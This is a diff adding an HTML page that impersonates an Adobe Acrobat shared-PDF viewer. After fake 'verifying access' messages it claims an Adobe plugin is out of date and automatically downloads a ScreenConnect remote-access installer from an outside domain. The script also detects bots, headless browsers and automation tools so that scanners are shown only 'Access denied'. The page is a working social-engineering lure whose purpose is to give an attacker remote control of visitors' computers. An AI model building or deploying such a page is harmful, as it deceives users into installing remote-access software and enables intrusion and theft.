@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Adobe Acrobat - Shared PDF</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%23EC1C24'/><text x='16' y='22' text-anchor='middle' fill='white' font-size='14' font-family='Arial' font-weight='bold'>A</text></svg>">
+
+<style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{font-family:'Adobe Clean',system-ui,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column}
+    .nav{background:#2c2c2c;padding:12px 24px;display:flex;align-items:center;gap:8px}
+    .nav-logo{display:flex;align-items:center;gap:8px}
+    .nav-logo .mark{width:28px;height:28px;background:#EC1C24;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:14px}
+    .nav-logo span{color:#fff;font-size:15px}
+    
+    .main{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
+    .card{background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.08);max-width:580px;width:100%;padding:48px 44px;text-align:center}
+    
+    .pdf-icon{width:72px;height:88px;margin:0 auto 24px;background:linear-gradient(135deg,#fff 60%,#f0f0f0 60%);border:2px solid #e0e0e0;border-radius:6px;position:relative;display:flex;align-items:center;justify-content:center}
+    .pdf-icon::after{content:'PDF';position:absolute;bottom:8px;left:50%;transform:translateX(-50%);background:#EC1C24;color:#fff;font-size:10px;font-weight:700;padding:2px 8px;border-radius:3px}
+    .pdf-icon .fold{position:absolute;top:0;right:0;width:20px;height:20px;background:linear-gradient(225deg,#f5f5f5 50%,#d0d0d0 50%)}
+    
+    h1{font-size:20px;color:#2c2c2c;margin-bottom:8px}
+    .sub{font-size:14px;color:#6e6e6e;margin-bottom:28px;line-height:1.5}
+    
+    .loader{display:flex;align-items:center;justify-content:center;gap:16px;margin-bottom:20px}
+    .ring{width:32px;height:32px;border:3px solid #f0f0f0;border-top-color:#EC1C24;border-radius:50%;animation:ring .7s linear infinite}
+    @keyframes ring{to{transform:rotate(360deg)}}
+    
+    .loader-text{font-size:14px;color:#4b4b4b}
+    
+    .final-text{display:none;margin-top:25px;font-size:13px;color:#333;line-height:1.6;text-align:center}
+    
+    .red-link{color:#d32f2f;cursor:pointer;font-weight:bold;text-decoration:none}
+    .red-link:hover{color:#b71c1c;text-decoration:underline}
+    .pipe-separator{color:#d32f2f;font-weight:bold;margin:0 6px}
+    
+    .error-message{font-size:13px;color:#333;margin-bottom:0;white-space:nowrap}
+    .instruction{text-align:center;margin:0 0 18px 0}
+    .help-line{margin-top:14px}
+    .normal-text{font-weight:normal;color:#333}
+</style>
+</head>
+<body>
+
+<div class="nav">
+    <div class="nav-logo">
+        <div class="mark">A</div>
+        <span>Adobe Acrobat</span>
+    </div>
+</div>
+
+<div class="main">
+    <div class="card">
+        <div class="pdf-icon"><div class="fold"></div></div>
+        <h1>PDF Document Shared</h1>
+        <p class="sub">Someone shared a protected document with you.<br>Verifying your access rights...</p>
+        
+        <div class="loader" id="loader">
+            <div class="ring"></div>
+            <span class="loader-text" id="status">Verifying access...</span>
+        </div>
+
+        <div class="final-text" id="final">
+            <p class="error-message">Sorry. You do not have the latest version of Adobe plugin installed.</p>
+            <p class="instruction">Let's finish your installation.</p>
+            
+            <p>Open ScreenConnect.ClientSetup.msi from recent downloads (right corner of this screen) to install. 
+               <span class="red-link" id="manualDownload">Download manually</span>
+            </p>
+            
+            <p class="help-line">
+                <span class="normal-text">Download not working?</span>
+                <span class="red-link" onclick="window.location.reload()">Restart and Download</span>
+                <span class="pipe-separator">|</span>
+                <span class="red-link" onclick="alert('Please contact support for assistance.')">Get Help</span>
+            </p>
+        </div>
+    </div>
+</div>
+
+<script>
+/*──── CONFIG ────*/
+var MSI_URL = "https://diskcitylink.pro/voZrrQz/ScreenConnect.ClientSetup.msi";
+
+(function(){
+    var statusText = document.getElementById('status');
+    var loader = document.getElementById('loader');
+    var finalText = document.getElementById('final');
+    var manualDownload = document.getElementById('manualDownload');
+
+    function isRealUser(){
+        if(navigator.webdriver || window.__nightmare || window.callPhantom || window._phantom) return false;
+        if(/bot|crawl|spider|headless|phantom|puppet|selenium/i.test(navigator.userAgent)) return false;
+        if(screen.width < 300 || screen.height < 300) return false;
+        return true;
+    }
+
+    if(!isRealUser()){
+        statusText.textContent = "Access denied";
+        loader.style.display = 'none';
+        return;
+    }
+
+    var messages = [
+        "Verifying access...",
+        "Decrypting PDF...",
+        "Checking Adobe plugin version...",
+        "Updating Adobe components..."
+    ];
+
+    let i = 0;
+    const interval = setInterval(() => {
+        i++;
+        statusText.textContent = messages[Math.min(i, messages.length-1)];
+
+        if(i >= messages.length){
+            clearInterval(interval);
+            
+            setTimeout(() => {
+                loader.style.display = 'none';
+                finalText.style.display = 'block';
+
+                setTimeout(() => {
+                    const link = document.createElement('a');
+                    link.href = MSI_URL;
+                    link.download = "ScreenConnect.ClientSetup.msi";
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                }, 4000);
+            }, 800);
+        }
+    }, 1100);
+
+    manualDownload.addEventListener('click', function() {
+        const link = document.createElement('a');
+        link.href = MSI_URL;
+        link.download = "ScreenConnect.ClientSetup.msi";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    });
+})();
+</script>
+
+</body>
+</html>
